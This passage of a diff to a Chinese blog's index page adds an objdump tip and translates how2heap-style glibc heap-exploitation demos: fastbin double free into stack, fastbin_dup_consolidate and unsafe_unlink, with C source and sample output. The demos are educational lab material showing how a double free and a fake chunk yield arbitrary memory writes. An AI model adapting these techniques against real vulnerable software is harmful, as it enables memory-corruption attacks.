@@ -150,6 +150,81 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-re-base" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/26/re-base/">Linux逆向工程基础</a>
+    </h1>
+  
+
+        
+        <a href="/2019/03/26/re-base/" class="archive-article-date">
+  	<time datetime="2019-03-26T15:39:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>objdump 输出intel格式汇编</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -M intel -d program_name</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">RE</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/03/26/re-base/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-ghidra" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -748,7 +823,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">output:</span><br><span class="line">这个文件是fastbin_dup.c的扩展，通过欺骗malloc</span><br><span class="line">返回一个指向受控位置的指针（在本例中为堆栈）</span><br><span class="line">我们让malloc()返回 0x7ffd09e37068</span><br><span class="line">分配3个buffer</span><br><span class="line">1st malloc(8): 0x1801010</span><br><span class="line">2nd malloc(8): 0x1801030</span><br><span class="line">3rd malloc(8): 0x1801050</span><br><span class="line">free掉第一个buffer--(a)</span><br><span class="line">如果我们现在再次free 0x1801010,程序就会崩溃因为 0x1801010 在free list的顶部</span><br><span class="line">所以我们free掉 0x1801030</span><br><span class="line">现在我们可以再次free 0x1801010, 因为它不是free list的头</span><br><span class="line">现在我们得到free list [ 0x1801010, 0x1801030, 0x1801010  ] 我们现在通过修改 0x1801010 的数据来执行攻击</span><br><span class="line">1st malloc(8): 0x1801010</span><br><span class="line">2nd malloc(8): 0x1801030</span><br><span class="line">现在得free list [ 0x1801010  ].</span><br><span class="line">现在，我们可以访问 0x1801010，同时它仍然是free list的头部。</span><br><span class="line">所以现在我们正在写入一个假的free size (在这里是 0x20) 到栈上</span><br><span class="line">所以malloc会认为那里有一个free chunk</span><br><span class="line">并return一个指向 0x7ffd09e37068 的指针</span><br><span class="line">现在，我们将 0x1801010 处的数据的前8个字节覆盖在0x20之前</span><br><span class="line">3rd malloc(8): 0x1801010, 将栈地址放到free list中</span><br><span class="line">4th malloc(8): 0x7ffd09e37068</span><br></pre></td></tr></table></figure>
 <h2 id="fastbin-dup-consolidate-c"><a href="#fastbin-dup-consolidate-c" class="headerlink" title="fastbin_dup_consolidate.c"></a>fastbin_dup_consolidate.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"分配两个fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free掉 p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"分配large bin来触发malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"在 malloc_consolidate() 中, p1 被放到 unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"触发double free漏洞\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们能pass malloc()的检查，因为p1不是fast top\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在 p1 在 unsorted bin 和 fast bin中. 所以我们能分配到 p1 两次: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">output:</span><br><span class="line">分配两个fastbins: p1=0x250a010 p2=0x250a060</span><br><span class="line">free掉 p1!</span><br><span class="line">分配large bin来触发malloc_consolidate(): p3=0x250a0b0</span><br><span class="line">在 malloc_consolidate() 中, p1 被放到 unsorted bin.</span><br><span class="line">触发double free漏洞</span><br><span class="line">我们能pass malloc()的检查，因为p1不是fast top</span><br><span class="line">现在p1在 unsorted bin 和 fast bin中. 所以我们能分配到p1两次: 0x250a010 0x250a010</span><br></pre></td></tr></table></figure>
-<h2 id="unsafe-unlink-c"><a href="#unsafe-unlink-c" class="headerlink" title="unsafe_unlink.c"></a>unsafe_unlink.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"欢迎来到 unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"实验进行的环境：Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"此技术仅适用于glibc的禁用tcache-option的情况, 请参阅build_glibc.sh以获取构建说明。\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"该技术用于当你拥有一个已知位置的指针指向一个可以调用 unlink 的区域时\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"最常见的情况是易受攻击的缓冲区，可以溢出并控制全局指针。\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//足够大，不使用fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"这个练习是使用free来破坏全局指针chunk0_ptr来实现任意内存写入。\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr 位于 %p, 指向 %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们要破坏的chunk是 %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我现在创建一个假chuck在chunk0里.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们设置假chuck的'next_free_chunk' (fd) 指向 &amp;chunk0_ptr 附近 以便满足 P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们设置假chuck的 'previous_free_chunk' (bk) 指向 &amp;chunk0_ptr  附近 以便满足 P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"这样设置，我们就可以绕过这个检查：(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");</span></span><br><span class="line">	<span class="comment">//chunk0_ptr[1] = sizeof(size_t);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr-&gt;size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &amp;chunk0_ptr[1]);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="unsafe-unlink-c"><a href="#unsafe-unlink-c" class="headerlink" title="unsafe_unlink.c"></a>unsafe_unlink.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"欢迎来到 unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"实验进行的环境：Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"此技术仅适用于glibc的禁用tcache-option的情况, 请参阅build_glibc.sh以获取构建说明。\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"该技术用于当你拥有一个已知位置的指针指向一个可以调用 unlink 的区域时\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"最常见的情况是易受攻击的缓冲区，可以溢出并控制全局指针。\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//足够大，不使用fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"这个练习是使用free来破坏全局指针chunk0_ptr来实现任意内存写入。\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr 位于 %p, 指向 %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们要破坏的chunk是 %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我现在创建一个假chuck在chunk0里.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们设置假chuck的'next_free_chunk' (fd) 指向 &amp;chunk0_ptr 附近 以便满足 P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们设置假chuck的 'previous_free_chunk' (bk) 指向 &amp;chunk0_ptr  附近 以便满足 P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"这样设置，我们就可以绕过这个检查：(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, "我们需要确保假 chunk 的 'size' 与下一块的 'previous_size' (chunk+size)匹配\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "通过此设置，我们可以通过此检查： (chunksize(P) != prev_size (next_chunk(P)) == False\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");</span></span><br><span class="line">	<span class="comment">//chunk0_ptr[1] = sizeof(size_t);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr-&gt;size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &amp;chunk0_ptr[1]);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们假设 chunk0 中有溢出，以便我们可以自由地更改 chunk1 的元数据。\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们缩小了 chunk0 的大小 (在 chunk1 中保存为 'previous_size') 这样 free 就会认为 chunk0 从我们放置假 chunk 的地方开始。\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"重要的是，我们的假 chunk 正好从已知指针指向的地方开始，并且我们相应地收缩 chunk 。\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"如果我们正常释放 chunk0，chunk1.previous_size 将为0x90，但它现在为： %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"我们将 chunk1 的 'previous_in_use' 设置为 False，将我们的假 chunk 标记为free。\n\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在我们 free 掉 chunk1 以便向后整合 unlink 我们的假 chunk，覆盖chunk0_ptr。\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"您可以在 https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344 中找到 unlink 宏的来源\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"此时，我们可以使用 chunk0_ptr 覆盖自身，以指向任意位置。\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr 